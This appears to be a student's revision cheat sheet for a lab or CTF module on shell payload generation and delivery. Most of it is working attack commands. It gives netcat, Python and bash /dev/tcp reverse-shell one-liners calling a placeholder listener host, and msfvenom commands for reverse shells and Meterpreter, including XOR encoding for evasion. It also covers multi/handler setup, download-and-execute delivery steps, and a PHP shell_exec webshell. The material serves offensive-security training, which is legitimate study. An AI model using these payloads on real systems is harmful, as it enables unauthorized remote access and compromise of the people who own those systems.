# 🐚 SHELL PAYLOAD GENERATION & DELIVERY

> ** Revision Edition**\
> `CHOOSE → GENERATE → DELIVER → LISTEN → EXECUTE → CATCH → MANAGE`

> \[!CAUTION\] Organized from the supplied **Shell Payload Generation &
> Delivery** module for controlled labs, CTFs, and explicitly authorized
> testing.

------------------------------------------------------------------------

# 🗺️ Module Map

\| Section \| Original Heading \| Revision Focus \|
\|\-\--\|\-\--\|\-\--\| \| 01 \| Common Shell Payloads \| Shell
alternatives and payload selection \| \| 02 \| msfvenom \| Generation,
formats, staged vs. stageless \| \| 03 \| Metasploit multi/handler \|
Matching handlers and managing sessions \| \| 04 \| Practical Exercises:
Linux \| ELF payloads and PHP webshell workflow \| \| 05 \| Practical
Exercises: Windows \| EXE and Meterpreter lab workflow \| \| 06 \| Final
Revision \| Command index and memory maps \|

------------------------------------------------------------------------

# 01 --- Common Shell Payloads

A listener waits for a connection. A **payload** is what causes the
authorized target to establish the shell connection.

``` text
PAYLOAD + LISTENER → REMOTE SHELL
```

## Payload Selection Strategy

Consider:

``` text
Target operating system
Available interpreters/tools
Network restrictions
Execution context
Security controls
Required listener/handler
```

## Netcat Without `-e`

The source demonstrates named pipes/FIFOs when a Netcat build does not
support `-e`.

### Bind-shell lab pattern

``` bash
mkfifo /tmp/f
nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1
rm /tmp/f
```

### Reverse-shell lab pattern

``` bash
mkfifo /tmp/f
nc <LISTENER_IP> 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1
rm /tmp/f
```

## Script-Based Shells

The module discusses Python, Bash, PowerShell, Perl, Ruby, and PHP as
possible shell-building environments.

### Python lab pattern

``` bash
python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LISTENER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### Bash TCP lab pattern

``` bash
bash -i >& /dev/tcp/<LISTENER_IP>/4444 0>&1
```

> \[!NOTE\] `/dev/tcp` availability depends on the Bash build.

------------------------------------------------------------------------

# 02 --- msfvenom

`msfvenom` generates payloads for different platforms and output
formats.

## Core Syntax

``` bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>
```

\| Parameter \| Meaning \| \|\-\--\|\-\--\| \| `-p` \| Payload \| \|
`LHOST` \| Callback/listener address \| \| `LPORT` \| Listener port \|
\| `-f` \| Output format \| \| `-o` \| Output filename \|

## Windows EXE Example

``` bash
msfvenom -p windows/x64/shell/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o shell.exe
```

------------------------------------------------------------------------

# 03 --- Staged vs. Stageless

## Stageless

Everything required is contained in one payload.

``` text
PAYLOAD → CONNECT → SHELL
```

Naming clue:

``` text
shell_reverse_tcp
      ↑
 underscore
```

Example:

``` bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o stageless_shell
```

A basic shell payload can use a simple listener:

``` bash
nc -lvnp 4444
```

## Staged

The first component connects, then a compatible handler sends the next
stage.

``` text
STAGER → HANDLER → SEND STAGE → SESSION
```

Naming clue:

``` text
shell/reverse_tcp
     ↑
    slash
```

Example:

``` bash
msfvenom -p windows/x64/shell/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o staged_shell.exe
```

### 🧠 Memory Trick

``` text
_  → usually STAGELESS
/  → usually STAGED
```

Confirm when uncertain:

``` bash
msfvenom --info <payload>
```

------------------------------------------------------------------------

# 04 --- Meterpreter Payloads

### Windows x64 staged Meterpreter

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o meterpreter_staged.exe
```

### Linux x86 stageless Meterpreter

``` bash
msfvenom -p linux/x86/meterpreter_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o meterpreter_stageless
```

------------------------------------------------------------------------

# 05 --- Output Formats

\| Format \| Typical Context \| \|\-\--\|\-\--\| \| `exe` \| Windows
executable \| \| `elf` \| Linux executable \| \| `dll` \| Dynamic
library \| \| `aspx` \| ASP.NET/IIS \| \| `jsp` \| Java Server Pages \|
\| `war` \| Java application server \| \| `python` \| Python environment
\| \| `powershell` \| PowerShell environment \|

Discover payloads:

``` bash
msfvenom --list payloads
```

Filter example from the module:

``` bash
msfvenom --list payloads | grep linux | grep meterpreter
```

------------------------------------------------------------------------

# 06 --- Encoding

The module demonstrates:

``` bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -e x64/xor -i 3 \
-o encoded_shell.exe
```

``` text
-e → encoder
-i → number of encoding iterations
```

> \[!IMPORTANT\] The source notes that changing a payload\'s
> representation does not guarantee avoidance of modern behavior-based
> detection.

------------------------------------------------------------------------

# 07 --- Complete Payload Workflow

``` text
CHOOSE PLATFORM
      ↓
CHOOSE ARCHITECTURE
      ↓
CHOOSE PAYLOAD
      ↓
STAGED OR STAGELESS?
      ↓
CHOOSE FORMAT
      ↓
SET LHOST + LPORT
      ↓
GENERATE
      ↓
PREPARE MATCHING LISTENER/HANDLER
      ↓
EXECUTE IN AUTHORIZED LAB
      ↓
SESSION
```

------------------------------------------------------------------------

# 08 --- Metasploit multi/handler

`multi/handler` receives compatible Metasploit payload connections and
manages sessions.

Especially useful for:

``` text
Staged payloads
Meterpreter
Multiple sessions
Metasploit integration
```

Start:

``` bash
sudo msfconsole
```

Load:

``` text
use multi/handler
```

View:

``` text
options
```

------------------------------------------------------------------------

# 09 --- Configure multi/handler

Three values must coordinate with the generated payload:

``` text
PAYLOAD
LHOST
LPORT
```

Example:

``` text
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST <LISTENER_IP>
set LPORT 4444
options
```

## ⭐ Golden Rule

``` text
MSFVENOM              MULTI/HANDLER
PAYLOAD  ═══════════  PAYLOAD
LHOST    ═══════════  LHOST
LPORT    ═══════════  LPORT
```

------------------------------------------------------------------------

# 10 --- Start the Handler

``` text
exploit
```

Background job:

``` text
exploit -j
```

A staged connection may show:

``` text
Sending stage ...
```

------------------------------------------------------------------------

# 11 --- Session Management

List:

``` text
sessions
```

Interact:

``` text
sessions -i 1
```

Verification:

``` text
whoami
hostname
```

Background:

``` text
background
```

Jobs:

``` text
jobs
```

------------------------------------------------------------------------

# 12 --- Handler vs. Basic Listener

\| Need \| Simple Listener \| multi/handler \| \|\-\--\|\-\--:\|\-\--:\|
\| Basic stageless shell \| ✓ \| ✓ \| \| Staged payload \| --- \| ✓ \|
\| Meterpreter \| --- \| ✓ \| \| Session management \| Limited \| ✓ \|
\| Metasploit integration \| --- \| ✓ \| \| Lightweight \| ✓ \| --- \|

``` text
STAGELESS BASIC SHELL → simple listener may be enough
STAGED / METERPRETER → multi/handler
```

------------------------------------------------------------------------

# 13 --- Troubleshooting

``` text
[ ] Exact PAYLOAD match?
[ ] Correct staged/stageless type?
[ ] Correct architecture?
[ ] Correct LHOST?
[ ] Correct LPORT?
[ ] Listener reachable?
[ ] Firewall permits authorized lab connection?
[ ] Required privilege for chosen port?
```

Remember:

``` text
shell/reverse_tcp ≠ shell_reverse_tcp
```

------------------------------------------------------------------------

# 14 --- Practical Exercises: Linux

## Stageless ELF

Generate:

``` bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o shell.elf
```

Serve:

``` bash
python3 -m http.server 8000
```

Listen:

``` bash
nc -lvnp 4444
```

Authorized lab target:

``` bash
wget http://<LISTENER_IP>:8000/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf
```

## Staged Linux Shell

Generate:

``` bash
msfvenom -p linux/x64/shell/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o staged_shell.elf
```

Handler:

``` text
use multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp
set LHOST <LISTENER_IP>
set LPORT 4444
exploit -j
```

------------------------------------------------------------------------

# 15 --- PHP Webshell Lab

The supplied module uses:

``` php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

In its provided training application, simple checks include:

``` text
?cmd=whoami
?cmd=id
```

Concept:

``` text
HTTP REQUEST → cmd parameter → shell_exec() → OS output → HTTP RESPONSE
```

------------------------------------------------------------------------

# 16 --- Practical Exercises: Windows

## Stageless Windows EXE

``` bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o shell.exe
```

Serve:

``` bash
python3 -m http.server 8000
```

Listen:

``` bash
nc -lvnp 4444
```

Authorized lab download:

``` powershell
Invoke-WebRequest http://<LISTENER_IP>:8000/shell.exe `
-OutFile C:\Users\Administrator\Desktop\shell.exe
```

## Staged Windows Meterpreter

Generate:

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o meterpreter.exe
```

Handler:

``` text
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LISTENER_IP>
set LPORT 4444
exploit -j
```

Interact:

``` text
sessions -i 1
```

Meterpreter verification:

``` text
sysinfo
getuid
```

### 🧠 Revision Point

`sysinfo` displays information about the compromised lab system,
including OS/hostname details.

------------------------------------------------------------------------

# ⚡ MASTER COMMAND CHEAT SHEET

## Listener

``` bash
nc -lvnp 4444
```

## msfvenom Template

``` bash
msfvenom -p <PAYLOAD> \
LHOST=<LISTENER_IP> LPORT=<PORT> \
-f <FORMAT> -o <OUTPUT>
```

## Linux Stageless

``` bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o shell.elf
```

## Linux Staged

``` bash
msfvenom -p linux/x64/shell/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f elf -o staged_shell.elf
```

## Windows Stageless

``` bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o shell.exe
```

## Windows Staged Meterpreter

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<LISTENER_IP> LPORT=4444 \
-f exe -o meterpreter.exe
```

## HTTP Server

``` bash
python3 -m http.server 8000
```

## multi/handler

``` text
use multi/handler
set PAYLOAD <EXACT_PAYLOAD>
set LHOST <LISTENER_IP>
set LPORT <PORT>
options
exploit -j
```

## Sessions

``` text
sessions
sessions -i 1
background
jobs
```

## Meterpreter

``` text
sysinfo
getuid
```

------------------------------------------------------------------------

# 🧠 30-Second Revision Map

``` text
             NEED REMOTE SHELL
                    │
                    ▼
             CHOOSE PAYLOAD
                    │
          ┌─────────┴─────────┐
          │                   │
      STAGELESS             STAGED
          │                   │
      underscore?            slash?
          │                   │
          ▼                   ▼
   SIMPLE LISTENER      MULTI/HANDLER
          │                   │
          └─────────┬─────────┘
                    ▼
                 EXECUTE
                    │
                    ▼
                  SESSION
                    │
                    ▼
             VERIFY ACCESS
```

# ⭐ Fast Memory Table

\| Question \| Remember \| \|\-\--\|\-\--\| \| Generate payload \|
`msfvenom` \| \| Stageless clue \| `_` \| \| Staged clue \| `/` \| \|
Basic listener \| `nc -lvnp 4444` \| \| Staged handler \|
`multi/handler` \| \| Handler matching \| PAYLOAD + LHOST + LPORT \| \|
Background handler \| `exploit -j` \| \| List sessions \| `sessions` \|
\| Interact \| `sessions -i <ID>` \| \| Meterpreter system info \|
`sysinfo` \| \| Meterpreter identity \| `getuid` \| \| Serve lab files
\| `python3 -m http.server 8000` \|

------------------------------------------------------------------------

# 🏁 My Cyber Journey Progress

``` text
RECONNAISSANCE
      ↓
SCANNING
      ↓
VULNERABILITY IDENTIFICATION
      ↓
EXPLOITATION
      ↓
METERPRETER / POST-EXPLOITATION
      ↓
MSFVENOM FUNDAMENTALS
      ↓
EXPLOITATION & WEAPONISATION
      ↓
SHELLS & LISTENERS FUNDAMENTALS
      ↓
SHELL PAYLOAD GENERATION & DELIVERY
      ↓
PAYLOAD → HANDLER → SESSION
```

## Core Takeaways

**Payload:** establishes the shell connection when executed.

**Stageless:** self-contained payload; a basic listener may be enough.

**Staged:** initial component connects first and a compatible handler
delivers the next stage.

**msfvenom:** generates payloads for different platforms and formats.

**multi/handler:** receives compatible Metasploit payloads and manages
sessions.

**Webshell:** provides command execution through the authorized
vulnerable web application used by the lab.

**Golden rule:** coordinate payload type, callback address, and callback
port with the listener/handler.
